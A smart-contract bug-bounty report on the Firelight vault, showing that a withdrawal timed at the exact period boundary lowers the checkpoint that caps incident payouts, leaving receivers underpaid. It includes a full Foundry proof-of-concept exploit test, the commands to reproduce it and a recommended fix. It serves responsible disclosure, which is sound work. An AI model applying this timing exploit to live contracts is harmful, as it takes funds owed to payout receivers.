# 89319 sc high exact period boundary withdrawal is included in the period start exposure lookup and permanently underpays the payout receiver

**Submitted on Aug 18th 2026 at 15:03:18 UTC by @marcin37 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89319
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

An ordinary `FirelightVault` shareholder can reduce an honestly approved incident payout by requesting a delayed withdrawal in a block timestamped exactly at the incident capture period's start `T`. The withdrawal remains in a bucket that `payout` treats as exposed, but `_logTrace` also appends the post-withdrawal active balance at key `T`. Because `totalAssetsAt(T)` returns the latest checkpoint whose key is less than or equal to `T`, it selects that new boundary checkpoint as the period-start exposure cap. `IncidentManager` then accepts the partial return and permanently closes the incident. In the reproduced case, moving the same 2-asset-unit withdrawal from `T+1` to `T` reduces the receiver's payment from 3 to 1 asset unit while the shareholder later claims 1 asset unit and retains another 1 asset unit as active vault value.

## Root cause

`withdraw` moves value into delayed-withdrawal accounting and records the post-withdrawal active assets at the current timestamp:

```solidity
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

In the reproduced path, the previous total-assets checkpoint precedes `T`, so `Checkpoints.push` appends the post-withdrawal value under a new key `T`. `upperLookupRecent(T)` then inclusively returns that new checkpoint instead of the pre-boundary value:

```solidity
self._trace.push(key, uint208(len));
self._values.push(value);

uint208 idx = self._trace.upperLookupRecent(key);
return idx > 0 ? self._values[idx] : 0;
```

`FirelightVault.payout` uses the boundary-inclusive lookup as a cap separate from the still-payable withdrawal bucket. `IncidentManager` records whatever amount the vault returns and closes the incident without requiring the approved amount to be satisfied:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));

uint256 vaultPaidAmount = _executePayout(
    $, incidentId, assessmentRoundId, incident.period, incident.captureTimestamp, totalAssessmentLoss
);
if (vaultPaidAmount > 0) incident.vaultPaidAmount = vaultPaidAmount;
incident.status = IncidentStatus.CLOSED;
```

The faulty relation crosses three explicitly in-scope production assets: `FirelightVault.sol` produces and consumes the exact-boundary checkpoint, `Checkpoints.sol` appends and inclusively retrieves it, and `IncidentManager.sol` finalizes the underpaid incident.

## Attack path

1. A shareholder owns withdrawable vault shares before a predictable capture-period boundary. The material reachability precondition is that the shareholder's withdrawal transaction is included in a block whose timestamp equals the exact boundary `T`.
2. The shareholder calls the ordinary public `withdraw` path for `W` asset units. This creates a delayed withdrawal and appends an `_traceTotalAssets` checkpoint with value `A-W` at key `T`; `totalAssetsAt(T)`, which previously resolved to the earlier value `A`, now resolves to `A-W`.
3. Honest incident roles create, confirm, assess, and approve a valid incident captured at `T`; the shareholder needs no incident, payout, or administrative role.
4. The vault pays only up to `A-W`, and the manager sets the incident to `CLOSED`. After the delay, the shareholder claims the residual withdrawal and retains the remaining active share value.

## Impact

The receiver permanently loses value that the shareholder's collateral was committed to cover, and the shareholder retains the corresponding value after the incident is closed.

| Measurement                    |   No-action baseline | Matched `T+1` control |   Exact-`T` withdrawal |
| ------------------------------ | -------------------: | --------------------: | ---------------------: |
| `totalAssetsAt(T)`             |        3 asset units |         3 asset units |           1 asset unit |
| Receiver payment               |        3 asset units |         3 asset units |           1 asset unit |
| Incident status                |             `CLOSED` |              `CLOSED` |               `CLOSED` |
| Later shareholder claim        | 0 asset units; fails |  0 asset units; fails | 1 asset unit; succeeds |
| Active vault value after claim |        0 asset units |         0 asset units |           1 asset unit |

The gross approved vault request is 3 asset units. The newly affected value is the 2-asset-unit receiver shortfall, not the full request. Of those 2 units, 1 becomes a successful delayed claim and 1 remains active value backing the shareholder's remaining shares. At the PoC's fixed price of USD 1 per asset unit, this miniature witness is a USD 2 shortfall; for `Q >= A`, the reproduced mechanism scales with the boundary withdrawal `W`, bounded by the shareholder's withdrawable value and the vault's exposed assets.

## Proof of Concept

* Framework: Foundry 1.7.1 (`4072e48705af9d93e3c0f6e29e93b5e9a40caed8`), Solidity 0.8.28, London EVM
* Source revision: `42f9ea5e43d88b35197b901acc2a8c24b314fa62`
* Fork: none; the in-scope Phase 2 implementation is intended for deployment/upgrade, so the test deploys the exact frozen production `FirelightVault` and `IncidentManager` locally behind `ERC1967Proxy`
* Environment: no variables; Node.js/npm and a Foundry installation with Solidity 0.8.28 cached are required

The ERC-20, allocator, and fixed USD 1 price feed are deterministic interface-conforming dependencies used identically in all three arms. Neither affected production contract is mocked or replaced. Save the complete Solidity block below as `test/ExactBoundaryIncidentPayoutShortfall.t.sol`, then run:

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm ci

poc_tmp="$(mktemp -d)"
mkdir "$poc_tmp/src"
forge fmt --check test/ExactBoundaryIncidentPayoutShortfall.t.sol
forge test \
  --root . \
  --contracts "$poc_tmp/src" \
  --lib-paths node_modules \
  --out "$poc_tmp/out" \
  --cache-path "$poc_tmp/cache" \
  --use 0.8.28 \
  --no-auto-detect \
  --offline \
  --via-ir \
  --evm-version london \
  --optimize \
  --optimizer-runs 10000 \
  --code-size-limit 1000000 \
  -R "firelight/=contracts/" \
  -R "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/contracts/" \
  -R "@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/contracts/" \
  --match-path test/ExactBoundaryIncidentPayoutShortfall.t.sol \
  --match-test test_exactBoundaryWithdrawalUnderpaysClosedIncident \
  -vv
```

Decisive output:

```
Ran 1 test for test/ExactBoundaryIncidentPayoutShortfall.t.sol:ExactBoundaryIncidentPayoutShortfallTest
[PASS] test_exactBoundaryWithdrawalUnderpaysClosedIncident()
Logs:
  production FirelightVault proxy: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
  ordinary shareholder: 0x00000000000000000000000000000000000A11cE
  control period-start assets: 3
  adversarial period-start assets: 1
  control receiver payout (asset units): 3
  adversarial receiver payout (asset units): 1
  receiver shortfall (asset units): 2
  later shareholder claim (asset units): 1
  shareholder active value after claim (asset units): 1

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

### Complete PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {FirelightVault} from "firelight/core/FirelightVault.sol";
import {IncidentManager} from "firelight/core/IncidentManager.sol";
import {IAggregatorV3} from "firelight/core/interfaces/IAggregatorV3.sol";
import {ICoverOrderAllocator} from "firelight/core/interfaces/ICoverOrderAllocator.sol";
import {IFirelightVault} from "firelight/core/interfaces/IFirelightVault.sol";
import {IIncidentManager} from "firelight/core/interfaces/IIncidentManager.sol";
import {MockERC20} from "firelight/test/MockERC20.sol";
import {MockIncidentManagerCoverOrderAllocator} from "firelight/test/MockIncidentManagerCoverOrderAllocator.sol";
import {MockPriceFeed} from "firelight/test/MockPriceFeed.sol";

interface Vm {
    function prank(address sender) external;
    function startPrank(address sender) external;
    function stopPrank() external;
    function warp(uint256 timestamp) external;
    function snapshotState() external returns (uint256 snapshotId);
    function revertToState(uint256 snapshotId) external returns (bool success);
}

contract ExactBoundaryIncidentPayoutShortfallTest {
    error AssertEq(bytes32 label, uint256 expected, uint256 actual);
    error AssertBool(bytes32 label, bool expected, bool actual);

    event log_named_address(string key, address value);
    event log_named_uint(string key, uint256 value);

    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    address private constant ATTACKER = address(0xA11CE);
    address private constant RECEIVER = address(0xBEEF);
    address private constant FIRST_LOSS_BUFFER = address(0xF1B);
    bytes32 private constant MARKET_ID = keccak256("nc1-market");

    uint256 private constant A = 3;
    uint256 private constant W = 2;
    uint256 private constant Q_CANONICAL = 3e18;
    uint48 private constant PERIOD_DURATION = 1 days;

    MockERC20 private asset;
    FirelightVault private vault;
    IncidentManager private incidentManager;
    MockIncidentManagerCoverOrderAllocator private allocator;
    uint48 private boundary;
    uint256 private capturePeriod;
    uint256 private withdrawalPeriod;

    struct Outcome {
        uint256 totalAssetsAtBoundary;
        uint256 receiverPaid;
        uint256 residualWithdrawal;
        uint256 pendingAfterPayout;
        uint256 activeAfterPayout;
        uint256 incidentVaultPaid;
        uint8 incidentStatus;
        bool claimSucceeded;
        uint256 claimed;
        uint256 pendingAfterClaim;
        uint256 activeAfterClaim;
        uint256 vaultBalanceAfterClaim;
        uint256 attackerBalanceAfterClaim;
    }

    function test_exactBoundaryWithdrawalUnderpaysClosedIncident() public {
        _setUpEquivalentState();

        uint256 snapshotId = vm.snapshotState();
        Outcome memory baseline = _runArm(0);
        _bool(vm.revertToState(snapshotId), true, "baseline revert");

        snapshotId = vm.snapshotState();
        Outcome memory control = _runArm(1);
        _bool(vm.revertToState(snapshotId), true, "control revert");

        Outcome memory adversarial = _runArm(2);

        _assertBaselineAndControl(baseline, "baseline");
        _assertBaselineAndControl(control, "control");

        _eq(adversarial.totalAssetsAtBoundary, 1, "adv checkpoint");
        _eq(adversarial.receiverPaid, 1, "adv receiver");
        _eq(adversarial.residualWithdrawal, 1, "adv residual");
        _eq(adversarial.pendingAfterPayout, 1, "adv pending payout");
        _eq(adversarial.activeAfterPayout, 1, "adv active payout");
        _eq(adversarial.incidentVaultPaid, 1, "adv incident paid");
        _eq(adversarial.incidentStatus, uint8(IIncidentManager.IncidentStatus.CLOSED), "adv closed");
        _bool(adversarial.claimSucceeded, true, "adv claim success");
        _eq(adversarial.claimed, 1, "adv claimed");
        _eq(adversarial.pendingAfterClaim, 0, "adv pending claim");
        _eq(adversarial.activeAfterClaim, 1, "adv active claim");
        _eq(adversarial.vaultBalanceAfterClaim, 1, "adv vault balance");
        _eq(adversarial.attackerBalanceAfterClaim, 1, "adv actor balance");

        _eq(control.receiverPaid - adversarial.receiverPaid, 2, "receiver shortfall");
        _eq(control.totalAssetsAtBoundary - adversarial.totalAssetsAtBoundary, 2, "checkpoint delta");
        _eq(adversarial.claimed - control.claimed, 1, "retained claim");
        _eq(adversarial.activeAfterClaim - control.activeAfterClaim, 1, "retained active");

        emit log_named_address("production FirelightVault proxy", address(vault));
        emit log_named_address("ordinary shareholder", ATTACKER);
        emit log_named_uint("control period-start assets", control.totalAssetsAtBoundary);
        emit log_named_uint("adversarial period-start assets", adversarial.totalAssetsAtBoundary);
        emit log_named_uint("control receiver payout (asset units)", control.receiverPaid);
        emit log_named_uint("adversarial receiver payout (asset units)", adversarial.receiverPaid);
        emit log_named_uint("receiver shortfall (asset units)", control.receiverPaid - adversarial.receiverPaid);
        emit log_named_uint("later shareholder claim (asset units)", adversarial.claimed);
        emit log_named_uint("shareholder active value after claim (asset units)", adversarial.activeAfterClaim);
    }

    function _setUpEquivalentState() private {
        asset = new MockERC20("NC1 asset", "NC1", 0);

        FirelightVault implementation = new FirelightVault();
        FirelightVault.InitParams memory vaultParams = FirelightVault.InitParams({
            defaultAdmin: address(this),
            limitUpdater: address(0),
            blocklister: address(0),
            pauser: address(0),
            periodConfigurationUpdater: address(0),
            rescuer: address(0),
            depositLimit: 100,
            periodConfigurationDuration: PERIOD_DURATION
        });
        bytes memory vaultInit = abi.encodeCall(
            FirelightVault.initialize, (IERC20(address(asset)), "Firelight Vault Share", "FLV", abi.encode(vaultParams))
        );
        vault = FirelightVault(address(new ERC1967Proxy(address(implementation), vaultInit)));

        allocator = new MockIncidentManagerCoverOrderAllocator();
        allocator.setVault(IFirelightVault(address(vault)));
        allocator.setCanonicalDecimals(18);
        allocator.setMockCapacityConfig(
            ICoverOrderAllocator.CapacityConfig({
                minCAR: 10_000,
                firstLossBufferToken: IERC20(address(asset)),
                firstLossBuffer: FIRST_LOSS_BUFFER,
                effectiveLeverage: 20_000,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        );

        MockPriceFeed priceFeed = new MockPriceFeed(8, 1e8);
        IncidentManager managerImplementation = new IncidentManager();
        bytes memory managerInit = abi.encodeCall(
            IncidentManager.initialize,
            (
                address(this),
                address(this),
                address(this),
                address(this),
                address(this),
                address(this),
                address(this),
                address(this),
                RECEIVER,
                ICoverOrderAllocator(address(allocator)),
                IAggregatorV3(address(priceFeed)),
                uint48(10 days)
            )
        );
        incidentManager = IncidentManager(address(new ERC1967Proxy(address(managerImplementation), managerInit)));

        vault.grantRole(vault.PAYOUT_ROLE(), address(incidentManager));
        vault.grantRole(vault.INCIDENT_ROLE(), address(incidentManager));
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), address(this));
        vault.addToPayoutAllowlist(RECEIVER);

        asset.mint(ATTACKER, A);
        vm.startPrank(ATTACKER);
        asset.approve(address(vault), A);
        vault.deposit(A, ATTACKER);
        vm.stopPrank();

        boundary = vault.currentPeriodEnd();
        capturePeriod = vault.periodAtTimestamp(boundary);
        withdrawalPeriod = capturePeriod + 1;
        allocator.setOrderMarket(1, MARKET_ID, capturePeriod, Q_CANONICAL, RECEIVER);

        _eq(vault.totalAssets(), A, "initial assets");
        _eq(vault.balanceOf(ATTACKER), A, "initial shares");
        _eq(vault.totalAssetsAt(boundary), A, "initial checkpoint");
        _bool(vault.hasRole(vault.PAYOUT_ROLE(), ATTACKER), false, "attacker vault payout role");
        _bool(vault.hasRole(vault.INCIDENT_ROLE(), ATTACKER), false, "attacker vault incident role");
        _bool(incidentManager.hasRole(incidentManager.CURATOR_ROLE(), ATTACKER), false, "attacker curator role");
        _bool(
            incidentManager.hasRole(incidentManager.ASSESSMENT_APPROVER_ROLE(), ATTACKER),
            false,
            "attacker approver role"
        );
    }

    function _runArm(uint8 arm) private returns (Outcome memory outcome) {
        if (arm == 2) {
            vm.warp(boundary);
            _withdraw();
            vm.warp(uint256(boundary) + 1);
        } else {
            vm.warp(uint256(boundary) + 1);
            if (arm == 1) _withdraw();
        }

        uint256 receiverBefore = asset.balanceOf(RECEIVER);
        uint256 incidentId = _approveValidIncident();

        outcome.totalAssetsAtBoundary = vault.totalAssetsAt(boundary);
        outcome.receiverPaid = asset.balanceOf(RECEIVER) - receiverBefore;
        outcome.residualWithdrawal = vault.withdrawalsOf(withdrawalPeriod, ATTACKER);
        outcome.pendingAfterPayout = vault.pendingWithdrawAssets();
        outcome.activeAfterPayout = vault.totalAssets();

        (IIncidentManager.Incident memory incident, bool exists) = incidentManager.getIncident(incidentId);
        _bool(exists, true, "incident exists");
        outcome.incidentVaultPaid = incident.vaultPaidAmount;
        outcome.incidentStatus = uint8(incident.status);

        vm.warp(uint256(boundary) + 2 * PERIOD_DURATION);
        uint256 attackerBefore = asset.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        (outcome.claimSucceeded,) =
            address(vault).call(abi.encodeCall(FirelightVault.claimWithdraw, (withdrawalPeriod)));
        outcome.claimed = asset.balanceOf(ATTACKER) - attackerBefore;
        outcome.pendingAfterClaim = vault.pendingWithdrawAssets();
        outcome.activeAfterClaim = vault.totalAssets();
        outcome.vaultBalanceAfterClaim = asset.balanceOf(address(vault));
        outcome.attackerBalanceAfterClaim = asset.balanceOf(ATTACKER);
    }

    function _withdraw() private {
        vm.prank(ATTACKER);
        vault.withdraw(W, ATTACKER, ATTACKER);
    }

    function _approveValidIncident() private returns (uint256 incidentId) {
        incidentId = incidentManager.createIncident(boundary, "NC1 covered incident", keccak256("PAYOUT-015-NC1"));
        incidentManager.confirmIncident(incidentId, "ipfs://payout-015-nc1");

        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({coverTokenId: 1, marketId: MARKET_ID, amount: Q_CANONICAL});
        incidentManager.addAssessmentLosses(incidentId, losses);
        incidentManager.submitCurrentAssessment(incidentId);
        incidentManager.approveCurrentAssessment(incidentId);
    }

    function _assertBaselineAndControl(Outcome memory outcome, bytes32 prefix) private pure {
        _eq(outcome.totalAssetsAtBoundary, 3, prefix);
        _eq(outcome.receiverPaid, 3, "safe receiver");
        _eq(outcome.residualWithdrawal, 0, "safe residual");
        _eq(outcome.pendingAfterPayout, 0, "safe pending payout");
        _eq(outcome.activeAfterPayout, 0, "safe active payout");
        _eq(outcome.incidentVaultPaid, 3, "safe incident paid");
        _eq(outcome.incidentStatus, uint8(IIncidentManager.IncidentStatus.CLOSED), "safe closed");
        _bool(outcome.claimSucceeded, false, "safe claim failure");
        _eq(outcome.claimed, 0, "safe claimed");
        _eq(outcome.pendingAfterClaim, 0, "safe pending claim");
        _eq(outcome.activeAfterClaim, 0, "safe active claim");
        _eq(outcome.vaultBalanceAfterClaim, 0, "safe vault balance");
        _eq(outcome.attackerBalanceAfterClaim, 0, "safe actor balance");
    }

    function _eq(uint256 actual, uint256 expected, bytes32 label) private pure {
        if (actual != expected) revert AssertEq(label, expected, actual);
    }

    function _bool(bool actual, bool expected, bytes32 label) private pure {
        if (actual != expected) revert AssertBool(label, expected, actual);
    }
}
```

## Recommendation

Make the period-start exposure snapshot immutable against user operations timestamped at the boundary. For example, materialize a dedicated snapshot before any key-`T` deposit or withdrawal can enter the lookup, or read the last total-assets checkpoint strictly before `T` while continuing to include the separately payable withdrawal buckets. Add a regression that holds actors, amounts, and incident lifecycle constant while moving only the withdrawal from `T+1` to `T`, and require the same receiver payment and no residual shareholder entitlement.
